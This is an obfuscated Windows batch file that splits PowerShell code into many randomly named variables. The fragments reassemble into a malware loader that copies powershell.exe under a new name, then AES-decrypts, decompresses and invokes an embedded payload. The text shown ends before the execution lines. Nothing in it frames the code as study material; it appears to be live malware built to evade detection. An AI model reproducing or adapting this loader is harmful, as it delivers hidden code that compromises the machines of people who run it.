@echo off
set "jkCoDekFtm=xe"
set "nTVUONilIp=Po"
set "tqArxtFCuU=0\"
set "ygDyDUnTlJ=\W"
set "yhAbhTsvIB=ll"
set "aARVxGtiqJ=do"
set "uLLrYipugd=\v"
set "ruLhRvEwTh=po"
set "BfDBNKQuJm=rS"
set "VXYkEeBoym=ow"
set "EuMqYUUMRd=co"
set "shrUkYbtLF=py"
set "aPUjVAdcrD=in"
set "GnjZheluUE=rs"
set "gigkbKZWNG= C"
set "RkReNKFeTU=we"
set "DNZmLBcuDM=he"
set "IQlfRjzvDN=ll"
set "BMHlsvnCpn=nd"
set "hqORphEXhK=he"
set "NAJznelLaN=.e"
set "ypTLeNGvKZ=Sy"
set "VpYzzJtNnz=ws"
set "WCpVcqmKdc=Wi"
set "CbWCQYoHbW=we"
set "WOCvimnfmJ=1."
set "EPQhRceAYH=y "
set "HlAgmPbdiY= /"
set "JOMfpZDeqY=st"
set "znGdvXqbtk=:\"
set "CcuEPFenfR=32"
set "IaZAIETlhL=s\"
set "PXlQtBMgDO=em"
set "GjcyGTtizy= %~dp0"
set "nqvNKqZzXY=cd"
set "mtKmayUWej=BC;$"
set "hjZtPDQUSj=lBlo"
set "QmYtMUgwED=$vpf"
set "aSWNRtrkGg=Syst"
set "upHoGAPHRG=join"
set "mnmKJBajdw== [S"
set "WhbABWcTlj=pfFz"
set "ijcnDgOxsH=rans"
set "ocIUqbHQLz=uLRv"
set "PHgWsboFgc=.IO."
set "OhgVrnwrWn=gN+y"
set "wrXMzrLUvb=Secu"
set "ZAQFZoXbHU=Invo"
set "jZQeAVGqzM=]::C"
set "KWzgTiAtye=.Cry"
set "ToTpkBwIpb=lPk "
set "VxRQylDAWf=m(, "
set "EzcvJIDBHL=-nop"
set "udNdQpNMrH=Comp"
set "ICONOPapbV=$rcs"
set "gaQmOIjTer=bjec"
set "iaqaxOqvRD=lPk."
set "quAZDvhpJd=comp"
set "qHNnhkfQHW=[Sys"
set "SsYBCZEejc=9tpc"
set "ntkhGsOGQl=rity"
set "aFdHmNQloJ=ke($"
set "aFbMEjaXNN=tem."
set "nRymdqXfyf=6esa"
set "MTMhbfxztK=ect "
set "sQIYXedKVh= '')"
set "ZysxsORPQw=wfBW"
set "NbMMPmhSfR=stem"
set "ObqyBisBfT=pher"
set "zwUzXUxQSo=raph"
set "CSmBJCcywb=ck($"
set "lrrqApsCmU=v = "
set "CJInipaqLV=P4Ia"
set "XnHlSlRlMj=[-1."
set "ScMFEWcIMO= = N"
set "dYojVGDKLv=oryS"
set "AyWfGglJdu=trea"
set "vcArKEBmFr=.Dis"
set "lVYmGDihfE=Bmor"
set "hFmBULNuZL=New-"
set "XFJYtGzAqZ=Conv"
set "kCeOLfMGCs=am;$"
set "AcIzUFEDhB=Rv ="
set "pGxZHeZptT=vert"
set "YiyxJWGnau=brea"
set "nwAXLobaiY=gMod"
set "FKBFAPRbAs=v, 0"
set "TsxIBvgQQp=ispo"
set "jPbErPkmYF=z.Pa"
set "BagCYmsrYD=pres"
set "ljkcWvOVcz=;$Df"
set "MkuIlxpDRH=yste"
set "UqZpkwzYKs=F'[-"
set "XtRYNXTZhx=se()"
set "BbGCyiouQB=iron"
set "nncPGWlOXy=tS46"
set "tSccXbTdCo=tsWi"
set "VqajqXMrpS= [Sy"
set "PRusgufZVz=($YF"
set "dcaGwMiKYD=ress"
set "YkJBbOwnaN=stem"
set "XItJGzgkUX=ion."
set "PridiCvgfl=rf);"
set "HCqqpRjZLm=ress"
set "ClSWXrfbaZ=ecry"
set "KxzcjwfrgS=ptog"
set "hhhCDOlyjn=Star"
set "sgriTdznWr=nage"
set "IrRIBhEMfK=rtS4"
set "AJyuftkIDz=sQz."
set "KrGQDUqwyV=.Cre"
set "cOLitFdmAx=b.En"
set "AFckqPYKpF=();$"
